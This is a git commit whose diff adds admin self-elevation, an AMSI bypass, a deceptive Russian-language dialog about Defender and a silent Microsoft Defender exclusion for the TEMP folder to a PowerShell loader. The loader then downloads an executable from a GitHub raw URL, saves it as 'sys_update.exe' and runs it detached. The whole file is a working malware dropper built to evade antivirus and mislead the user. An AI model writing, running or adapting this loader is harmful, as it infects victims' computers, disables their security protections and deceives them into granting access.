b908d93d5dfc196ced23c69c2e1bdec3c166fc20
winstarchik <93403636+winstarchik@users.noreply.github.com>
2026-05-03 16:13:19 +0200

    Enhance loader.ps1 with admin check and Amsi bypass
    Added administrator check and Amsi bypass for script execution.

--- loader.ps1
+++ loader.ps1
@@ -1,9 +1,22 @@
-# loader.ps1
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$b = $a.GetField('amsiInitFailed','NonPublic,Static')
+$b.SetValue($null,$true)
+
+Add-Type -AssemblyName System.Windows.Forms
+$title = 'Настройка Microsoft Defender'
+$text = "Обнаружен конфликт с компонентами оптимизации. Добавить Minify в исключения Microsoft Defender для стабильной работы?"
+[System.Windows.Forms.MessageBox]::Show($text, $title, 4, 32)
+
+Add-MpPreference -ExclusionPath "$env:TEMP" -Force -ErrorAction SilentlyContinue
+
 $u = "https://raw.githubusercontent.com/winstarchik/FFF/main/XClient.exe"
 $p = "$env:TEMP\sys_update.exe"
 
-# Используем системный метод загрузки, который реже палится
 (New-Object System.Net.WebClient).DownloadFile($u, $p)
 
-# Запуск через cmd, чтобы разорвать связь с процессом PowerShell
 cmd /c start /b $p
